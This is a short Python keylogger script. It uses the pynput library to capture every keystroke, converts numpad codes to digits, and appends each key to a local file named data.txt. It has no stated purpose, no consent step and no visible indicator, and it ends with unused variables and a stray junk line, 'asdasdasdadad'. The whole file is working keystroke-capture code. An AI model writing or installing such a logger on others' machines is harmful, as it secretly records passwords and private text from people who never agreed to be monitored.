from pynput import keyboard






file_path='data.txt'

import time
import datetime

em_str=''
minute=0



def on_press(key):
		
	global em_str
	em_str=em_str+'-'
	if str(key)=='<96>':
		key='0'
	if str(key)=='<97>':
		key='1'
	if str(key)=='<98>':
		key='2'
	if str(key)=='<99>':
		key='3'
	if str(key)=='<100>':
		key='4'
	if str(key)=='<101>':
		key='5'
	if str(key)=='<102>':
		key='6'
	if str(key)=='<103>':
		key='7'
	if str(key)=='<104>':
		key='8'
	if str(key)=='<105>':
		key='9'
	
	with open(file_path, 'a') as file: 
		file.write(str(key) + '-')
		file.close()
	
with keyboard.Listener(on_press=on_press) as listener:
	listener.join()

minute+=1


asdasdasdadad